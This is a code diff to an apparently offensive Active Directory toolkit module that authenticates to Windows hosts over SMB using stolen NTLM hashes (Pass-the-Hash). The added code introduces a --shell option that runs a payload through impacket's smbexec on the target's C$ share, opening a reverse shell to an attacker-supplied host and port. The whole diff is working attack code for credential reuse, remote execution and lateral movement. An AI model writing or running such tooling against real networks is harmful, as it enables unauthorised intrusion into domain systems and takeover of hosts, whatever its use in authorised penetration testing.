@@ -1,4 +1,7 @@
-"""Pass-the-Hash — authenticate with NTLM hash via SMB/WMI."""
+"""Pass-the-Hash -- authenticate with NTLM hash via SMB/WMI.
+
+Supports --shell for interactive shell after successful PtH authentication.
+"""
 
 from __future__ import annotations
 
@@ -25,7 +28,10 @@ def run(args: Any) -> int:
         print("[!] Pass-the-Hash requires --hashes LM:NT", file=sys.stderr)
         return 1
 
-    print(f"[*] Pass-the-Hash → {args.target} ({args.domain}\\{cred.username})")
+    shell_mode = getattr(args, "shell", False)
+    print("[*] Pass-the-Hash → {} ({}\\{}){}".format(
+        args.target, args.domain, cred.username,
+        " [interactive shell]" if shell_mode else ""))
 
     try:
         from impacket.smbconnection import SMBConnection
@@ -36,15 +42,52 @@ def run(args: Any) -> int:
     try:
         smb = SMBConnection(args.target, args.target, sess_port=445)
         smb.login(cred.username, "", args.domain, cred.lm_hash, cred.nt_hash)
-        print(f"[+] SMB authentication successful as {args.domain}\\{cred.username}")
-        print(f"    OS: {smb.getServerOS()}")
-        print(f"    Hostname: {smb.getServerName()}")
+        print("[+] SMB authentication successful as {}\\{}".format(
+            args.domain, cred.username))
+        print("    OS: {}".format(smb.getServerOS()))
+        print("    Hostname: {}".format(smb.getServerName()))
 
         shares = smb.listShares()
-        print(f"    Shares: {', '.join(s['shi1_netname'].rstrip(chr(0)) for s in shares)}")
+        print("    Shares: {}".format(
+            ", ".join(s["shi1_netname"].rstrip(chr(0)) for s in shares)))
 
         smb.logoff()
-        return 0
     except Exception as exc:
-        print(f"[-] PtH failed: {exc}", file=sys.stderr)
+        print("[-] PtH failed: {}".format(exc), file=sys.stderr)
         return 1
+
+    if shell_mode:
+        lhost = getattr(args, "lhost", None)
+        lport = int(getattr(args, "lport", 4444))
+        shell_type = getattr(args, "shell_type", "powershell")
+
+        if not lhost:
+            print("[!] --shell requires --lhost", file=sys.stderr)
+            return 1
+
+        print("[*] PtH auth OK, spawning shell via smbexec...")
+        from adxpl.core.shell_mixin import spawn_ad_shell
+
+        try:
+            from impacket.examples.smbexec import CMDEXEC
+        except ImportError:
+            print("[!] impacket smbexec not available", file=sys.stderr)
+            return 1
+
+        def _exec_payload(payload: str) -> None:
+            executer = CMDEXEC(
+                payload,
+                username=cred.username, password="",
+                domain=args.domain,
+                hashes=cred.impacket_hash,
+                share="C$", mode="SHARE",
+            )
+            executer.run(args.target)
+
+        ok = spawn_ad_shell(
+            target=args.target, lhost=lhost, lport=lport,
+            shell_type=shell_type, execute_fn=_exec_payload,
+        )
+        return 0 if ok else 1
+
+    return 0
